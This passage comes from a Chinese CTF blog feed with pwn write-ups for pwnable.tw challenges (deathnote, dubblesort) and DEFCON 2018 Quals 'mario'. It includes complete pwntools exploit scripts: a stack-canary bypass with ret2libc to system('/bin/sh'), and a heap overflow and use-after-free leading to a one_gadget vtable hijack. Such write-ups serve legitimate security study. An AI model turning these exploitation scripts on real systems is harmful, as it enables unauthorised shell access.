class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.send(asm(shellcode)+<span class="string">&#x27;\x6b\x40&#x27;</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main(<span class="string">&quot;chall.pwnable.tw&quot;</span>)</span><br></pre></td></tr></table></figure><p>参考博文：<br>(<a href="http://p4nda.top/2017/09/29/pwnable-tw-deathnote/">http://p4nda.top/2017/09/29/pwnable-tw-deathnote/</a>)</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwnable.tw dubblesort</title>
      <link href="/2020/10/14/Pwnable_dubblesort/"/>
      <url>/2020/10/14/Pwnable_dubblesort/</url>
      
        <content type="html"><![CDATA[<h3 id="Pwnable-tw-dubblesort"><a href="#Pwnable-tw-dubblesort" class="headerlink" title="Pwnable.tw  dubblesort"></a>Pwnable.tw  dubblesort</h3><blockquote><p>最近总是想写点东西，想来想去还是pwnable.tw上的题目值得记录，因此准备写个series，就从200分的dubblesort开始吧😝</p></blockquote><span id="more"></span><p>32位的程序，题目名是dubblesort冒泡排序，先分析一波：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__printf_chk(<span class="number">1</span>, (<span class="type">int</span>)<span class="string">&quot;What your name :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x40</span>u);</span><br><span class="line">  __printf_chk(<span class="number">1</span>, (<span class="type">int</span>)<span class="string">&quot;Hello %s,How many numbers do you what to sort :&quot;</span>);</span><br></pre></td></tr></table></figure><p>开始的name输入到stack上，read没有’\0’截断，因此可用来泄露栈里的数据，多为libc。</p><p>之后程序让我们输入sort number和number,这些数据都是存放在stack上的,然后执行sort()函数进行冒泡排序。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">__printf_chk(<span class="number">1</span>, (<span class="type">int</span>)<span class="string">&quot;Hello %s,How many numbers do you what to sort :&quot;</span>);</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;v9);</span><br><span class="line">count = v9;</span><br><span class="line"><span class="keyword">if</span> ( v9 )</span><br><span class="line">&#123;</span><br><span class="line">  v4 = &amp;nums;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    __printf_chk(<span class="number">1</span>, (<span class="type">int</span>)<span class="string">&quot;Enter the %d number : &quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, v4);</span><br><span class="line">    ++v5;</span><br><span class="line">    count = v9;</span><br><span class="line">    ++v4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v9 &gt; v5 );</span><br><span class="line">&#125;</span><br><span class="line">sort((<span class="type">unsigned</span> <span class="type">int</span> *)&amp;nums, count);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Result :&quot;</span>);</span><br></pre></td></tr></table></figure><p>由于输入的数量由我们控制，那就可以栈溢出了，难点在于程序开启了canary，因此我们要做的就是如何能够不改掉canary同时覆盖返回地址，并且在sort()后这些数据还能再对应的位置上(可能因为大小问题而被交换之类的)📍</p><p>在执行__isoc99_scanf(“%u”, v4);时，当我尝试输入一些非法的字符如’#’，由于”%u”表示接收数据格式为无符号的整形，因此视’#’为非法的字符，从而scanf执行失败，栈上对应的数据没有被修改，但也导致它留在了stdin里使得后面循环的scanf也无法正确执行，那有没有什么字符可以使得scanf视其为合法字符却不修改stack的数据呢?</p><p>网上查找一番了解到’+’和’-‘可以🎉。原因在于这两个符号用于定义正数和负数，当输入+4时会视为4，-4会视为无符号的0x100000000-4,因此当我们只输入’+’时，由于我们实际上什么也没输入，自然也就不会改写stack上的数据。</p><p>因此我们可以在canary前写入’0’,canary处写入’+’,cananry后面到ebp写str(0xf0000000)，ret_addr写system，然后写两个libc中’&#x2F;bin&#x2F;sh’的地址，这样构造的话sort()完其位置将不会因交换而改变（没有发生交换），从而能拿到flag🚩</p><p>EXP:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">DEBUG=<span class="number">0</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line"><span class="comment"># r=process(&quot;./dubblesort&quot;,env=&#123;&quot;LD_PRELOAD&quot;:&quot;../libc_32.so.6&quot;&#125;)</span></span><br><span class="line">p=process(<span class="string">&quot;./dubblesort&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>,<span class="number">10101</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;../libc_32.so.6&quot;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">got_plt_offset = <span class="number">0x1b0000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc address</span></span><br><span class="line">payload_1 = <span class="string">&quot;a&quot;</span>*<span class="number">24</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload_1)</span><br><span class="line">libc_addr = u32(p.recv()[<span class="number">30</span>:<span class="number">34</span>])-<span class="number">0xa</span></span><br><span class="line">libc_address = libc_addr - got_plt_offset</span><br><span class="line"><span class="comment"># libc_address=u32(p.recv(4))-0x1b3061</span></span><br><span class="line"></span><br><span class="line">info(<span class="string">&quot;libc: &quot;</span>+<span class="built_in">hex</span>(libc_address))</span><br><span class="line"></span><br><span class="line"><span class="comment"># p.recvuntil(&#x27;sort :&#x27;)</span></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">35</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">p.recvuntil(<span class="string">&quot;number : &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;number : &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;+&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">p.recvuntil(<span class="string">&quot;number : &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0xf0000000</span>))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;number : &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(libc.sym[<span class="string">&#x27;system&#x27;</span>]+libc_address))</span><br><span class="line">p.recvuntil(<span class="string">&quot;number : &quot;</span>)</span><br><span class="line"><span class="comment"># p.sendline(str(libc.sym[&#x27;system&#x27;]+libc_address+1))</span></span><br><span class="line">p.sendline(<span class="built_in">str</span>(libc_address+libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()))</span><br><span class="line">p.recvuntil(<span class="string">&quot;number : &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(libc_address+libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DEFCON2018_Quals_mario</title>
      <link href="/2020/10/12/DEFCON18_Quals_mario/"/>
      <url>/2020/10/12/DEFCON18_Quals_mario/</url>
      
        <content type="html"><![CDATA[<h3 id="DEFCON2018-mario"><a href="#DEFCON2018-mario" class="headerlink" title="DEFCON2018 mario"></a>DEFCON2018 mario</h3><blockquote><p>一次勇敢的尝试👼 领教了defcon的难度，总结了一点难题的规律：<br>1.代码量大<br>2.数据复杂<br>3.漏洞隐蔽<br>4.利用困难<br>5.C和C+混合,且用vector导致堆很琐碎</p></blockquote><span id="more"></span><p>我全程跟着hxp的脚本边调边做但也只是懂了大概80%，明白了漏洞所在，明白了leak的方法，但最后的拿shell很😵，hxp说是利用win_heap(指向one_gadget的heap)覆盖输出pizza objectd的函数vtable，再通过admire函数实现执行，可能还是我结构体或者vector分析的有问题吧😥</p><p>我先分析一下漏洞所在：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Before I start cooking your pizzas, do you have anything to declare? Please explain: &quot;</span>);</span><br><span class="line"> read_n_0((__int64)byte_20C480, <span class="number">0x12C</span>);</span><br><span class="line"> v1 = <span class="built_in">strlen</span>(byte_20C480);</span><br><span class="line"> *(_QWORD *)(a1 + <span class="number">32</span>) = <span class="built_in">malloc</span>(v1 + <span class="number">1</span>);</span><br><span class="line"> <span class="built_in">strcpy</span>(*(<span class="type">char</span> **)(a1 + <span class="number">32</span>), byte_20C480);</span><br></pre></td></tr></table></figure><p> cook函数会要求我们留言,并根据我们输入的数据长度来malloc。<br> 但如果mario生气的话会有一个’P’选项：<br> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">80</span>:</span><br><span class="line"> <span class="keyword">if</span> ( v3 )</span><br><span class="line"> &#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;last chance, explain yourself: &quot;</span>);</span><br><span class="line">   read_n_0(is_user[<span class="number">4</span>], <span class="number">300</span>);</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;too bad, no explanation is reasonable. BAM BAM BAM!&quot;</span>);</span><br><span class="line">   *((_BYTE *)is_user + <span class="number">65</span>) = <span class="number">1</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><br>  read_n函数参数为上买malloc的堆，但可写300字节，造成堆溢出</p><p>  还有一处漏洞在于cook后面：<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v14 &amp; <span class="number">0xF0</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( v14 &gt;&gt; <span class="number">4</span> == (v13 &amp; <span class="number">0xF</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Molto bene, all cooked!&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !(v14 &amp; <span class="number">0xF</span>) )</span><br><span class="line">      <span class="built_in">free</span>(*(<span class="type">void</span> **)(a1 + <span class="number">0x20</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;found non-approved pizzas. come on.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>  如果有1个好披萨和0x10个坏披萨则会执行free(上面malloc的)，造成uaf。</p><p>  漏洞大概是这些，接下来就是如何让mario生气了。<br>  题目很有意思，如果再order披萨的时候添加配料里有🍍，则会是坏披萨，mario会生气，并直接退出。<br>  因此为了做坏披萨并不退出，则可以通过两个utf8的拼接来实现菠萝的输入。</p><p>  按照上面的1个好0x10个坏使得free,控制大小进入unsorted bin，uaf第一次可泄露heap，第二次可泄露libc，自己调下就明白了。之后就到懵逼环节了。<br>  hxp大佬先new之后cook的留言写了’v’*4个字节，然后退出，之后用堆溢出改写前面一直利用的那个堆块为p64(win_addr)*2 + “X”*144 + p64(win_heap_addr)*2，然后执行admire拿shell。</p><p>  exp:<br>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">emojis = &#123;<span class="string">&#x27;pineapple&#x27;</span>: <span class="string">b&quot;\xf0\x9f\x8d\x8d&quot;</span>,</span><br><span class="line"><span class="string">&#x27;tomato&#x27;</span>: <span class="string">b&quot;\xf0\x9f\x8d\x85&quot;</span> &#125;</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">addr,PIE=<span class="literal">True</span></span>):</span><br><span class="line"><span class="keyword">if</span> PIE:</span><br><span class="line">text_base = <span class="built_in">int</span>(os.popen(<span class="string">&quot;pmap &#123;&#125;| awk &#x27;&#123;&#123;print $1&#125;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(text_base+addr)))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">gdb.attach(p,<span class="string">&quot;b *&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(addr)))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cust_new</span>(<span class="params">name</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;N&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;name?&quot;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cust_login</span>(<span class="params">name</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;L&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;name?&quot;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cook</span>(<span class="params">explanation=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;C&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;explain:&quot;</span>)</span><br><span class="line">    p.sendline(explanation)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;USER MENU&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">order</span>(<span class="params">items</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;O&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;how many pizzas?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(items)))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(items)):</span><br><span class="line">        p.recvuntil(<span class="string">&quot;how many ingredients?&quot;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(items[i])))</span><br><span class="line">        <span class="keyword">for</span> ing <span class="keyword">in</span> items[i]:</span><br><span class="line">            p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">            p.sendline(ing)</span><br><span class="line">            log.info(<span class="string">&quot;pizza &quot;</span> + <span class="built_in">str</span>(i+<span class="number">1</span>) + <span class="string">&quot;: adding &quot;</span> + <span class="built_in">str</span>(ing))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admire</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;A&quot;</span>)</span><br><span class="line">    p.recvline()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cust_logout</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;L&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">overflow</span>(<span class="params">payload</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;P&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;explain yourself:&quot;</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">why_upset</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;W&quot;</span>)</span><br><span class="line">    <span class="comment"># p.recvuntil(&quot;say: &quot;)</span></span><br><span class="line">    <span class="comment"># output = p.recvline()[:-1]</span></span><br><span class="line">    <span class="comment"># return repr(output)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">host,port=<span class="number">1234</span></span>):</span><br><span class="line"><span class="keyword">global</span> p</span><br><span class="line"><span class="keyword">if</span> host:</span><br><span class="line">p=remote(host,port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=process(<span class="string">&quot;./mario&quot;</span>)</span><br><span class="line">debug(<span class="number">0x0002E23</span>)</span><br><span class="line">cust_new(<span class="string">&#x27;1&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">good_pizza = [emojis[<span class="string">&#x27;tomato&#x27;</span>]]</span><br><span class="line">naughty_pizza = [emojis[<span class="string">&#x27;tomato&#x27;</span>] + emojis[<span class="string">&#x27;pineapple&#x27;</span>][:<span class="number">2</span>] + emojis[<span class="string">&#x27;pineapple&#x27;</span>][:<span class="number">2</span>], emojis[<span class="string">&#x27;pineapple&#x27;</span>][<span class="number">2</span>:] + emojis[<span class="string">&#x27;tomato&#x27;</span>]]</span><br><span class="line">payload=[]</span><br><span class="line">payload.append(good_pizza)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">payload.append(naughty_pizza)</span><br><span class="line">order(payload)</span><br><span class="line">cook(<span class="string">&#x27;1&#x27;</span>*<span class="number">0x104</span>)</span><br><span class="line">cust_logout()</span><br><span class="line">why_upset()</span><br><span class="line">p.recvuntil(<span class="string">&quot;say: &quot;</span>)</span><br><span class="line">heap_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">info(<span class="string">&quot;heap: &quot;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">cust_new(<span class="string">&#x27;2&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">order([good_pizza])</span><br><span class="line">cook(<span class="string">&#x27;2&#x27;</span>*<span class="number">0x104</span>)</span><br><span class="line">cust_logout()</span><br><span class="line">why_upset()</span><br><span class="line">p.recvuntil(<span class="string">&quot;say: &quot;</span>)</span><br><span class="line">libc.address=u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x6cdb78</span>+<span class="number">0x309000</span></span><br><span class="line">info(<span class="string">&quot;libc: &quot;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line">win_addr=libc.address+<span class="number">0x4527a</span></span><br><span class="line">cust_login(<span class="string">&#x27;2&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">order([[emojis[<span class="string">&#x27;tomato&#x27;</span>]]])</span><br><span class="line">cook(<span class="string">&#x27;v&#x27;</span>*<span class="number">4</span>)</span><br><span class="line">cust_logout()</span><br><span class="line">win_heap_addr=heap_addr - <span class="number">3984</span></span><br><span class="line">cust_login(<span class="string">&#x27;1&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">overflow(p64(win_addr)*<span class="number">2</span> + <span class="string">&quot;X&quot;</span>*<span class="number">144</span> + p64(win_heap_addr)*<span class="number">2</span>)</span><br><span class="line">cust_login(<span class="string">&quot;2&quot;</span>*<span class="number">8</span>)</span><br><span class="line">admire()</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">main(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><br>我飘了，连defcon的题都敢看了，不过这样也好，让我看清了自己的水平，希望自己能有一天再次回来看这道题目的时候，能够不像现在如此艰难吧。</p><p>补充，如没有最后两个p64的覆盖，则在执行call rax是寄存器位：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"> RAX  0x55aea44fbcac ◂— push   rbp</span><br><span class="line"> RBX  0x0</span><br><span class="line"> RCX  0x7ffd8bcbffa0 ◂— 0x0</span><br><span class="line"> RDX  0x55aea59401d0 —▸ 0x55aea4705c00 —▸ 0x55aea44fbcac ◂— push   rbp</span><br><span class="line"> RDI  0x55aea59401d0 —▸ 0x55aea4705c00 —▸ 0x55aea44fbcac ◂— push   rbp</span><br><span class="line"> RSI  0x7ffd8bcbffa0 ◂— 0x0</span><br><span class="line"> R8   0x7f3d93746740 ◂— 0x7f3d93746740</span><br><span class="line"> R9   0x2020202020202020 (&#x27;        &#x27;)</span><br><span class="line"> R10  0x0</span><br><span class="line"> R11  0x246</span><br><span class="line"> R12  0x55aea44fb5f0 ◂— xor    ebp, ebp</span><br><span class="line"> R13  0x7ffd8bcc19f0 ◂— 0x1</span><br><span class="line"> R14  0x0</span><br><span class="line"> R15  0x0</span><br><span class="line"> RBP  0x7ffd8bcc18b0 —▸ 0x7ffd8bcc18d0 —▸ 0x7ffd8bcc18f0 —▸ 0x7ffd8bcc1910 —▸ 0x55aea45012f0 ◂— ...</span><br><span class="line"> RSP  0x7ffd8bcbff70 ◂— 0x0</span><br><span class="line"> RIP  0x55aea44fd039 ◂— call   rax</span><br><span class="line">────────────────────────────────────────[ DISASM ]─────────────────────────────────────────</span><br><span class="line">   0x55aea44fd022    mov    rax, qword ptr [rax]</span><br><span class="line">   0x55aea44fd025    lea    rcx, [rbp - 0x1910]</span><br><span class="line">   0x55aea44fd02c    mov    rdx, qword ptr [rbp - 0x1918]</span><br><span class="line">   0x55aea44fd033    mov    rsi, rcx</span><br><span class="line">   0x55aea44fd036    mov    rdi, rdx</span><br><span class="line"> ► 0x55aea44fd039    call   rax</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwndbg&gt; telescope 0x55aea5940130 40</span><br><span class="line">00:0000│          0x55aea5940130 —▸ 0x7f3d92c2327a (do_system+1098) ◂— mov    rax, qword ptr [rip + 0x37ec37]</span><br><span class="line">... ↓</span><br><span class="line">02:0010│          0x55aea5940140 ◂— &#x27;XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX&#x27;</span><br><span class="line">... ↓</span><br><span class="line">14:00a0│ rdx rdi  0x55aea59401d0 —▸ 0x55aea4705c00 —▸ 0x55aea44fbcac ◂— push   rbp</span><br><span class="line">15:00a8│          0x55aea59401d8 —▸ 0x55aea5940210 ◂— 0x7f00858d9ff0</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到，拿shell的关键是在heap_overflow的时候改掉位于0x55aea59401d0 —▸ 0x55aea4705c00 —▸ 0x55aea44fbcac ◂— push   